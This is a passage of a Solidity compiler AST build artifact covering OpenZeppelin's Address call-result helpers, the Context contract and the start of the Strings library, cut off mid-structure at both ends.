overloadedDeclarations":[],"referencedDeclaration":1410,"src":"7674:7:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"id":1441,"nodeType":"Block","src":"8030:58:5","statements":[{"expression":{"arguments":[{"id":1437,"name":"returndata","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1412,"src":"8052:10:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":1438,"name":"errorMessage","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1414,"src":"8064:12:5","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1436,"name":"_revert","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1488,"src":"8044:7:5","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes_memory_ptr_$_t_string_memory_ptr_$returns$__$","typeString":"function (bytes memory,string memory) pure"}},"id":1439,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"8044:33:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1440,"nodeType":"ExpressionStatement","src":"8044:33:5"}]},"id":1442,"nodeType":"IfStatement","src":"7670:418:5","trueBody":{"id":1435,"nodeType":"Block","src":"7683:341:5","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1423,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":1420,"name":"returndata","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1412,"src":"7701:10:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1421,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"length","nodeType":"MemberAccess","src":"7701:17:5","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30","id":1422,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7722:1:5","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"7701:22:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1432,"nodeType":"IfStatement","src":"7697:286:5","trueBody":{"id":1431,"nodeType":"Block","src":"7725:258:5","statements":[{"expression":{"arguments":[{"arguments":[{"id":1426,"name":"target","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1408,"src":"7927:6:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":1425,"name":"isContract","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1177,"src":"7916:10:5","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_address_$returns$_t_bool_$","typeString":"function (address) view returns (bool)"}},"id":1427,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"7916:18:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},{"hexValue":"416464726573733a2063616c6c20746f206e6f6e2d636f6e7472616374","id":1428,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"7936:31:5","typeDescriptions":{"typeIdentifier":"t_stringliteral_cc2e4e38850b7c0a3e942cfed89b71c77302df25bcb2ec297a0c4ff9ff6b90ad","typeString":"literal_string \"Address: call to non-contract\""},"value":"Address: call to non-contract"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"},{"typeIdentifier":"t_stringliteral_cc2e4e38850b7c0a3e942cfed89b71c77302df25bcb2ec297a0c4ff9ff6b90ad","typeString":"literal_string \"Address: call to non-contract\""}],"id":1424,"name":"require","nodeType":"Identifier","overloadedDeclarations":[-18,-18],"referencedDeclaration":-18,"src":"7908:7:5","typeDescriptions":{"typeIdentifier":"t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$","typeString":"function (bool,string memory) pure"}},"id":1429,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"7908:60:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1430,"nodeType":"ExpressionStatement","src":"7908:60:5"}]}},{"expression":{"id":1433,"name":"returndata","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1412,"src":"8003:10:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"functionReturnParameters":1418,"id":1434,"nodeType":"Return","src":"7996:17:5"}]}}]},"documentation":{"id":1406,"nodeType":"StructuredDocumentation","src":"7184:277:5","text":" @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling\n the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\n _Available since v4.8._"},"id":1444,"implemented":true,"kind":"function","modifiers":[],"name":"verifyCallResultFromTarget","nameLocation":"7475:26:5","nodeType":"FunctionDefinition","parameters":{"id":1415,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1408,"mutability":"mutable","name":"target","nameLocation":"7519:6:5","nodeType":"VariableDeclaration","scope":1444,"src":"7511:14:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1407,"name":"address","nodeType":"ElementaryTypeName","src":"7511:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":1410,"mutability":"mutable","name":"success","nameLocation":"7540:7:5","nodeType":"VariableDeclaration","scope":1444,"src":"7535:12:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1409,"name":"bool","nodeType":"ElementaryTypeName","src":"7535:4:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":1412,"mutability":"mutable","name":"returndata","nameLocation":"7570:10:5","nodeType":"VariableDeclaration","scope":1444,"src":"7557:23:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1411,"name":"bytes","nodeType":"ElementaryTypeName","src":"7557:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"},{"constant":false,"id":1414,"mutability":"mutable","name":"errorMessage","nameLocation":"7604:12:5","nodeType":"VariableDeclaration","scope":1444,"src":"7590:26:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1413,"name":"string","nodeType":"ElementaryTypeName","src":"7590:6:5","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"7501:121:5"},"returnParameters":{"id":1418,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1417,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1444,"src":"7646:12:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1416,"name":"bytes","nodeType":"ElementaryTypeName","src":"7646:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"7645:14:5"},"scope":1489,"src":"7466:628:5","stateMutability":"view","virtual":false,"visibility":"internal"},{"body":{"id":1467,"nodeType":"Block","src":"8475:135:5","statements":[{"condition":{"id":1456,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1447,"src":"8489:7:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"id":1465,"nodeType":"Block","src":"8546:58:5","statements":[{"expression":{"arguments":[{"id":1461,"name":"returndata","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1449,"src":"8568:10:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":1462,"name":"errorMessage","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1451,"src":"8580:12:5","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1460,"name":"_revert","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1488,"src":"8560:7:5","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes_memory_ptr_$_t_string_memory_ptr_$returns$__$","typeString":"function (bytes memory,string memory) pure"}},"id":1463,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"8560:33:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1464,"nodeType":"ExpressionStatement","src":"8560:33:5"}]},"id":1466,"nodeType":"IfStatement","src":"8485:119:5","trueBody":{"id":1459,"nodeType":"Block","src":"8498:42:5","statements":[{"expression":{"id":1457,"name":"returndata","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1449,"src":"8519:10:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"functionReturnParameters":1455,"id":1458,"nodeType":"Return","src":"8512:17:5"}]}}]},"documentation":{"id":1445,"nodeType":"StructuredDocumentation","src":"8100:210:5","text":" @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n revert reason or using the provided one.\n _Available since v4.3._"},"id":1468,"implemented":true,"kind":"function","modifiers":[],"name":"verifyCallResult","nameLocation":"8324:16:5","nodeType":"FunctionDefinition","parameters":{"id":1452,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1447,"mutability":"mutable","name":"success","nameLocation":"8355:7:5","nodeType":"VariableDeclaration","scope":1468,"src":"8350:12:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1446,"name":"bool","nodeType":"ElementaryTypeName","src":"8350:4:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":1449,"mutability":"mutable","name":"returndata","nameLocation":"8385:10:5","nodeType":"VariableDeclaration","scope":1468,"src":"8372:23:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1448,"name":"bytes","nodeType":"ElementaryTypeName","src":"8372:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"},{"constant":false,"id":1451,"mutability":"mutable","name":"errorMessage","nameLocation":"8419:12:5","nodeType":"VariableDeclaration","scope":1468,"src":"8405:26:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1450,"name":"string","nodeType":"ElementaryTypeName","src":"8405:6:5","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"8340:97:5"},"returnParameters":{"id":1455,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1454,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1468,"src":"8461:12:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1453,"name":"bytes","nodeType":"ElementaryTypeName","src":"8461:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"8460:14:5"},"scope":1489,"src":"8315:295:5","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1487,"nodeType":"Block","src":"8699:457:5","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1478,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"id":1475,"name":"returndata","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1470,"src":"8775:10:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1476,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"length","nodeType":"MemberAccess","src":"8775:17:5","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":1477,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8795:1:5","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"8775:21:5","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"id":1485,"nodeType":"Block","src":"9105:45:5","statements":[{"expression":{"arguments":[{"id":1482,"name":"errorMessage","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1472,"src":"9126:12:5","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1481,"name":"revert","nodeType":"Identifier","overloadedDeclarations":[-19,-19],"referencedDeclaration":-19,"src":"9119:6:5","typeDescriptions":{"typeIdentifier":"t_function_revert_pure$_t_string_memory_ptr_$returns$__$","typeString":"function (string memory) pure"}},"id":1483,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"9119:20:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":1484,"nodeType":"ExpressionStatement","src":"9119:20:5"}]},"id":1486,"nodeType":"IfStatement","src":"8771:379:5","trueBody":{"id":1480,"nodeType":"Block","src":"8798:301:5","statements":[{"AST":{"nodeType":"YulBlock","src":"8956:133:5","statements":[{"nodeType":"YulVariableDeclaration","src":"8974:40:5","value":{"arguments":[{"name":"returndata","nodeType":"YulIdentifier","src":"9003:10:5"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"8997:5:5"},"nodeType":"YulFunctionCall","src":"8997:17:5"},"variables":[{"name":"returndata_size","nodeType":"YulTypedName","src":"8978:15:5","type":""}]},{"expression":{"arguments":[{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"9042:2:5","type":"","value":"32"},{"name":"returndata","nodeType":"YulIdentifier","src":"9046:10:5"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"9038:3:5"},"nodeType":"YulFunctionCall","src":"9038:19:5"},{"name":"returndata_size","nodeType":"YulIdentifier","src":"9059:15:5"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"9031:6:5"},"nodeType":"YulFunctionCall","src":"9031:44:5"},"nodeType":"YulExpressionStatement","src":"9031:44:5"}]},"documentation":"@solidity memory-safe-assembly","evmVersion":"london","externalReferences":[{"declaration":1470,"isOffset":false,"isSlot":false,"src":"9003:10:5","valueSize":1},{"declaration":1470,"isOffset":false,"isSlot":false,"src":"9046:10:5","valueSize":1}],"id":1479,"nodeType":"InlineAssembly","src":"8947:142:5"}]}}]},"id":1488,"implemented":true,"kind":"function","modifiers":[],"name":"_revert","nameLocation":"8625:7:5","nodeType":"FunctionDefinition","parameters":{"id":1473,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1470,"mutability":"mutable","name":"returndata","nameLocation":"8646:10:5","nodeType":"VariableDeclaration","scope":1488,"src":"8633:23:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1469,"name":"bytes","nodeType":"ElementaryTypeName","src":"8633:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"},{"constant":false,"id":1472,"mutability":"mutable","name":"errorMessage","nameLocation":"8672:12:5","nodeType":"VariableDeclaration","scope":1488,"src":"8658:26:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1471,"name":"string","nodeType":"ElementaryTypeName","src":"8658:6:5","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"8632:53:5"},"returnParameters":{"id":1474,"nodeType":"ParameterList","parameters":[],"src":"8699:0:5"},"scope":1489,"src":"8616:540:5","stateMutability":"pure","virtual":false,"visibility":"private"}],"scope":1490,"src":"194:8964:5","usedErrors":[]}],"src":"101:9058:5"},"id":5},"@openzeppelin/contracts/utils/Context.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/Context.sol","exportedSymbols":{"Context":[1511]},"id":1512,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1491,"literals":["solidity","^","0.8",".0"],"nodeType":"PragmaDirective","src":"86:23:6"},{"abstract":true,"baseContracts":[],"contractDependencies":[],"contractKind":"contract","documentation":{"id":1492,"nodeType":"StructuredDocumentation","src":"111:496:6","text":" @dev Provides information about the current execution context, including the\n sender of the transaction and its data. While these are generally available\n via msg.sender and msg.data, they should not be accessed in such a direct\n manner, since when dealing with meta-transactions the account sending and\n paying for execution may not be the actual sender (as far as an application\n is concerned).\n This contract is only required for intermediate, library-like contracts."},"fullyImplemented":true,"id":1511,"linearizedBaseContracts":[1511],"name":"Context","nameLocation":"626:7:6","nodeType":"ContractDefinition","nodes":[{"body":{"id":1500,"nodeType":"Block","src":"702:34:6","statements":[{"expression":{"expression":{"id":1497,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"719:3:6","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":1498,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","src":"719:10:6","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"functionReturnParameters":1496,"id":1499,"nodeType":"Return","src":"712:17:6"}]},"id":1501,"implemented":true,"kind":"function","modifiers":[],"name":"_msgSender","nameLocation":"649:10:6","nodeType":"FunctionDefinition","parameters":{"id":1493,"nodeType":"ParameterList","parameters":[],"src":"659:2:6"},"returnParameters":{"id":1496,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1495,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1501,"src":"693:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":1494,"name":"address","nodeType":"ElementaryTypeName","src":"693:7:6","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"692:9:6"},"scope":1511,"src":"640:96:6","stateMutability":"view","virtual":true,"visibility":"internal"},{"body":{"id":1509,"nodeType":"Block","src":"809:32:6","statements":[{"expression":{"expression":{"id":1506,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"826:3:6","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":1507,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"data","nodeType":"MemberAccess","src":"826:8:6","typeDescriptions":{"typeIdentifier":"t_bytes_calldata_ptr","typeString":"bytes calldata"}},"functionReturnParameters":1505,"id":1508,"nodeType":"Return","src":"819:15:6"}]},"id":1510,"implemented":true,"kind":"function","modifiers":[],"name":"_msgData","nameLocation":"751:8:6","nodeType":"FunctionDefinition","parameters":{"id":1502,"nodeType":"ParameterList","parameters":[],"src":"759:2:6"},"returnParameters":{"id":1505,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1504,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1510,"src":"793:14:6","stateVariable":false,"storageLocation":"calldata","typeDescriptions":{"typeIdentifier":"t_bytes_calldata_ptr","typeString":"bytes"},"typeName":{"id":1503,"name":"bytes","nodeType":"ElementaryTypeName","src":"793:5:6","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"792:16:6"},"scope":1511,"src":"742:99:6","stateMutability":"view","virtual":true,"visibility":"internal"}],"scope":1512,"src":"608:235:6","usedErrors":[]}],"src":"86:758:6"},"id":6},"@openzeppelin/contracts/utils/Strings.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/Strings.sol","exportedSymbols":{"Math":[2587],"Strings":[1686]},"id":1687,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":1513,"literals":["solidity","^","0.8",".0"],"nodeType":"PragmaDirective","src":"101:23:7"},{"absolutePath":"@openzeppelin/contracts/utils/math/Math.sol","file":"./math/Math.sol","id":1514,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":1687,"sourceUnit":2588,"src":"126:25:7","symbolAliases":[],"unitAlias":""},{"abstract":false,"baseContracts":[],"contractDependencies":[],"contractKind":"library","documentation":{"id":1515,"nodeType":"StructuredDocumentation","src":"153:34:7","text":" @dev String operations."},"fullyImplemented":true,"id":1686,"linearizedBaseContracts":[1686],"name":"Strings","nameLocation":"196:7:7","nodeType":"ContractDefinition","nodes":[{"constant":true,"id":1518,"mutability":"constant","name":"_SYMBOLS","nameLocation":"235:8:7","nodeType":"VariableDeclaration","scope":1686,"src":"210:54:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes16","typeString":"bytes16"},"typeName":{"id":1516,"name":"bytes16","nodeType":"ElementaryTypeName","src":"210:7:7","typeDescriptions":{"typeIdentifier":"t_bytes16","typeString":"bytes16"}},"value":{"hexValue":"30313233343536373839616263646566","id":1517,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"246:18:7","typeDescriptions":{"typeIdentifier":"t_stringliteral_cb29997ed99ead0db59ce4d12b7d3723198c827273e5796737c926d78019c39f","typeString":"literal_string \"0123456789abcdef\""},"value":"0123456789abcdef"},"visibility":"private"},{"constant":true,"id":1521,"mutability":"constant","name":"_ADDRESS_LENGTH","nameLocation":"293:15:7","nodeType":"VariableDeclaration","scope":1686,"src":"270:43:7","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":1519,"name":"uint8","nodeType":"ElementaryTypeName","src":"270:5:7","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"value":{"hexValue":"3230","id":1520,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"311:2:7","typeDescriptions":{"typeIdentifier":"t_rational_20_by_1","typeString":"int_const 20"},"value":"20"},"visibility":"private"},{"body":{"id":1568,"nodeType":"Block","src":"486:625:7","statements":[{"id":1567,"nodeType":"UncheckedBlock","src":"496:609:7","statements":[{"assignments":[1530],"declarations":[{"constant":false,"id":1530,"mutability":"mutable","name":"length","nameLocation":"528:6:7","nodeType":"VariableDeclaration","scope":1567,"src":"520:14:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1529,"name":"uint256","nodeType":"ElementaryTypeName","src":"520:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1537,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1536,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":1533,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1524,"src":"548:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":1531,"name":"Math","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2587,"src":"537:4:7","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Math_$2587_$","typeString":"type(library Math)"}},"id":1532,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"log10","nodeType":"MemberAccess","referencedDeclaration":2424,"src":"537:10:7","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256) pure returns (uint256)"}},"id":1534,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"537:17:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"31","id":1535,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"557:1:7","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"537:21:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"520:38:7"},{"assignments":[1539],"declarations":[{"constant":false,"id":1539,"mutability":"mutable","name":"buffer","nameLocation":"586:6:7","nodeType":"VariableDeclaration","scope":1567,"src":"572:20:7","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1538,"name":"string","nodeType":"ElementaryTypeName","src":"572:6:7","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"id":1544,"initialValue":{"arguments":[{"id":1542,"name":"length","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1530,"src":"606:6:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1541,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"NewExpression","src":"595:10:7","typeDescriptions":{"typeIdentifier":"t_function_objectcreation_pure$_t_uint256_$returns$_t_string_memory_ptr_$","typeString":"function (uint256) pure returns (string memory)"},"typeName":{"id":1540,"name":"string","nodeType":"ElementaryTypeName","src":"599:6:7","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}}},"id":1543,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"595:18:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"nodeType":"VariableDeclarationStatement","src":"572:41:7"},{"assignments":[1546],"declarations":[{"constant":false,"id":1546,"mutability":"mutable","name":"ptr","nameLocation":"635:3:7","nodeType":"VariableDeclaration","scope":1567,"src":"627:11:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1545,"name":"uint256","nodeType":"ElementaryTypeName","src":"627:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1547,"nodeType":"VariableDeclarationStatement","src":"627:11:7"},{"AST":{"nodeType":"YulBlock","src":"708:67:7","statements":[{"nodeType":"YulAssignment","src":"726:35:7","value":{"arguments":[{"name":"buffer","nodeType":"YulIdentifier","src":"737:6:7"},{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"749:2:7","type":"","value":"32"},{"name":"length","nodeType":"YulIdentifier","src":"753:6:7"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"745:3:7"},"nodeType":"YulFunctionCall","src":"745:15:7"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"733:3:7"},"nodeType":"YulFunctionCall","src":"733:28:7"},"variableNames":[{"name":"ptr","nodeType":"YulIdentifier","src":"726:3:7"}]}]},"documentation":"@solidity memory-safe-assembly","evmVersion":"london","externalReferences":[{"declaration":1539,"isOffset":false,"isSlot":false,"src":"737:6:7","valueSize":1},{"declaration":1530,"isOffset":false,"isSlot":false,"src":"753:6:7","valueSize":1},{"declaration":1546,"isOffset":false,"isSlot":false,"src":"726:3:7","valueSize":1}],"id":1548,"nodeType":"InlineAssembly","src":"699:76:7"},{"body":{"id":1563,"nodeType":"Block","src":"801:267:7","statements":[{"expression":{"id":1551,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"--","prefix":false,"src":"819:5:7","subExpression":{"id":1550,"name":"ptr","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1546,"src":"819:3:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":1552,"nodeType":"ExpressionStatement","src":"819:5:7"},{"AST":{"nodeType":"YulBlock","src":"902:84:7","statements":[{"expression":{"arguments":[{"name":"ptr","nodeType":"YulIdentifier","src":"932:3:7"},{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"946:5:7"},{"kind":"number","nodeType":"YulLiteral","src":"953:2:7","type":"","value":"10"}